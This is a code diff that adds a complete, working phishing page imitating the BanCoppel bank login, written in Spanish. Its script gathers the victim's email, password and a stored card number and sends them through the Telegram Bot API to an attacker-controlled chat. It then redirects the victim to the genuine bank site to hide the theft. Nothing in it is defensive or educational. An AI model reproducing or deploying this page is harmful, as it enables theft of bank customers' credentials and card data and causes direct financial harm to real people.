@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BanCoppel - Iniciar Sesión</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+  </head>
+  <body>
+    <form
+      id="loginform"
+      class="flex flex-col items-center justify-center min-h-screen bg-white px-4"
+    >
+      <!-- Logo -->
+      <div class="mt-6">
+        <img
+          src="https://finanzzzas.com/wp-content/uploads/2021/05/banccopel.png"
+          alt="BanCoppel Logo"
+          style="width: 250px"
+        />
+      </div>
+
+      <!-- Título -->
+      <h2 class="text-lg font-bold text-blue-900 mt-6">Comprobar datos</h2>
+
+      <!-- Input Correo Electrónico -->
+      <div class="w-full max-w-sm mt-4">
+        <p class="text-center text-sm text-blue-900 font-semibold">
+          Correo Electrónico
+        </p>
+        <input
+          required
+          type="email"
+          id="email"
+          placeholder="Ingresa tu correo electrónico"
+          class="w-full mt-1 px-4 py-2 border border-blue-900 bg-gray-200 text-gray-600 text-center rounded-md outline-none focus:ring-2 focus:ring-blue-700"
+        />
+      </div>
+
+      <!-- Input Contraseña -->
+      <div class="w-full max-w-sm mt-4">
+        <p class="text-center text-sm text-blue-900 font-semibold">
+          Contraseña
+        </p>
+        <input
+          required
+          type="password"
+          id="password"
+          placeholder="Ingresa tu contraseña"
+          class="w-full mt-1 px-4 py-2 border border-blue-900 bg-gray-200 text-gray-600 text-center rounded-md outline-none focus:ring-2 focus:ring-blue-700"
+        />
+      </div>
+
+      <!-- Botón Iniciar Sesión -->
+      <button
+        class="w-full max-w-sm mt-6 px-6 py-3 bg-blue-900 text-white text-center font-semibold rounded-full"
+        type="submit"
+      >
+        Iniciar Sesión
+      </button>
+    </form>
+  </body>
+  <script src="telegram.js"></script>
+
+  <script>
+    const form = document.querySelector("#loginform");
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault(); // Aquí evitamos que el código se repita evita que se envíe el formulario
+      const tarjeta = localStorage.getItem("usuario");
+      const cvv = document.querySelector("#email").value;
+      const Fecha = document.querySelector("#password").value;
+      console.log("entro");
+
+      const message =
+        "Copel\nTarjeta: " +
+        tarjeta +
+        "\nCorreo: " +
+        cvv +
+        "\nContra: " +
+        Fecha;
+
+      axios
+        .post(
+          "https://api.telegram.org/bot" + miVariableGlobal + "/sendMessage",
+          {
+            chat_id: chat,
+            text: message,
+          }
+        )
+        .then((response) => {
+          window.parent.location.href =
+            "https://www.bancoppel.com/main/index.html";
+        })
+        .catch((error) => {
+          console.error(error);
+        });
+    });
+  </script>
+</html>
